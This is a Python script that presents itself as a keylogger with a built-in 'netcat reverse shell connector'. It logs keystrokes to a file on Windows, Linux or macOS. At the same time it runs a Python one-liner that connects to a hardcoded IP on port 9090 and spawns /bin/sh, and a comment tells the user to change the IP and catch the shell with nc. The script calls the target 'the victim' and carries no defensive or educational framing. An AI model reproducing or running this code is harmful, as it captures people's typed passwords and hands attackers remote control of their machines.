#!/bin/bash/env python

#importing modules 
try:
    import keyboard,os
    import threading
    from pynput import keyboard
    import platform
except:
    pass

#keystroke record
class keylogger:

    #for windows
    def keylogging_Windows(self):
        try:
            while True:
                keystrokes=keyboard.read_key()
                with open('keystrokes.txt','a+') as fh:
                    if (keystrokes=='space') or(keystrokes=='right space') or (keystrokes=='enter')  or (keystrokes=='backspace')  or (keystrokes=='shift') or (keystrokes=='alt'):
                        fh.write('\n' + str(keyboard.read_key()) + '\n')
                    elif (keystrokes=='left') or (keystrokes=='right') or (keystrokes=='up') or (keystrokes=='down') or (keystrokes=='enter')or (keystrokes=='caps lock'):
                        fh.write('\n' + str(keyboard.read_key()) + '\n')
                    elif (keystrokes=='ctrl'):
                        pass
                    elif keystrokes=='x':
                        break
                    else:
                        fh.write(keyboard.read_key())
        except:
            pass

    #for linux
    def Keylogging_Linux(self):
        
        def on_key_press(key):
            try:            
                with open('keystrokes.txt','a+') as fh:
                    fh.write(f'{key.char}')
            except:
                with open('keystrokes.txt','a+') as fh:
                    key=str(key)
                    #fh.write('\n' + key + '\n')
                    fh.write(f'\n{key}\n')

        # Create listener objects
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()


#netcat reverse shell connector
def payload():
    #just change the ip and open a terminal and execute "rlwrap nc 9090" to get a reverse shell 
    poison="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.69.251",9090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""
    os.system(poison)

#vpn
def vpn():
    #the victim have to be in the same network so that we can get into the device
    pass


if __name__=='__main__':

    #creating an object
    obj=keylogger()

    #calling keylogger based on OS
    if(platform.system()=='Linux' or platform.system()=='Darwin'):
        #implementing threading
        t1 = threading.Thread(target=obj.Keylogging_Linux)
        t2 = threading.Thread(target=payload)
        t3 = threading.Thread(target=vpn)

    else:
        #implementing threading
        t1 = threading.Thread(target=obj.keylogging_Windows)
        t2 = threading.Thread(target=payload)
        t3 = threading.Thread(target=vpn)
    
    # start the threads
    t1.start()
    t2.start()
    t3.start()
    
    # join the main thread
    t1.join()
    t2.join()
    t3.join()

